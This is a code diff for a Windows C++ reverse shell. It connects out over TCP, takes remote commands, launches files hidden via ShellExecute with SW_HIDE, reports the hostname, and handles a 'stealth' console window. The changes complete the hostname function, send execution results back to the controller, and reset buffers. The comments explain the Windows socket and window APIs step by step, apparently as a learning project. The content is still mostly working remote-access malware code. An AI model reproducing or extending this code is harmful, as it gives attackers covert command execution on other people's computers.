@@ -29,11 +29,12 @@ void pwd(char* returnValue, int returnSize) {
 }
 
 void getHostname(char* returnValue, int returnSize) {
-
+    DWORD bufferlen = 257;
+    GetComputerName(returnValue, &bufferlen);
 }
 
 void execute_(char* returnValue, int returnSize, char *file) {
-    if ((int)(ShellExecute(nullptr, "open", file, nullptr, nullptr, SW_HIDE)) <= 32) {     //Function failed if the return value is a number less than or equal to 32.
+    if ((int)(ShellExecute(NULL, "open", file, NULL, NULL, SW_HIDE)) <= 32) {     //Function failed if the return value is a number less than or equal to 32.
         strcat(returnValue, "Error executing...\n");
     }
     else {
@@ -58,7 +59,7 @@ void RevShell() {
      * IPProt_TCP : TCP/IP protocol
      */
 
-    sockaddr_in address = {};    //Windows data struct that collects values of addressing schema to be used. IP address and port to connect to.
+    sockaddr_in address;    //Windows data struct that collects values of addressing schema to be used. IP address and port to connect to.
     address.sin_family = AF_INET;   //Assign the variable the address family.
     address.sin_addr.s_addr = inet_addr("127.0.0.1");   //IP Address to connect to. inet_addr() function converts the string from standard IPv4 dotted decimal notation, to an int value for used as an internet address.
     address.sin_port = htons(8080);     //The port to connect to. Converts unsigned short int hostshort from host-byte order to network-bye order.
@@ -112,6 +113,8 @@ void RevShell() {
                 getHostname(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
+                memset(temp, 0, sizeof(temp));
+                memset(CommandGiven, 0, sizeof(CommandGiven));
             }
             else if ((strcmp(CommandGiven, "exit") == 0)) {
                 closesocket(tcpsock);
@@ -138,11 +141,12 @@ void RevShell() {
                     char temp[257] = "";
                     execute_(temp, 257, executionCmd);
                     strcat(temp, "\n");
+                    send(tcpsock, temp, strlen(temp) + 1, 0);
                     memset(temp, 0, sizeof(temp));
                     memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
                 }
                 else {
-                    char temp[50] = "Invalid Command\n";
+                    char temp[20] = "Invalid Command\n";
                     send(tcpsock, temp, strlen(temp) + 1, 0);
                     memset(temp, 0, sizeof(temp));
                     memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
@@ -164,8 +168,8 @@ int main() {
      * So, to manage/modify other applications an object returns a handle which can be used by other applications.
      */
     AllocConsole(); //Assign a new console to the process.
-    stealth = FindWindowA("ConsoleWindowClass", nullptr);  //Find and attach stealth to the new window.
-    ShowWindow(stealth, SW_SHOWNORMAL);
+    stealth = FindWindowA("ConsoleWindowClass", NULL);  //Find and attach stealth to the new window.
+    ShowWindow(stealth, 1);
     /*
      * SW_SHOWNORMAL = 1 = Shown
      * SW_HIDE = 0 = Hidden
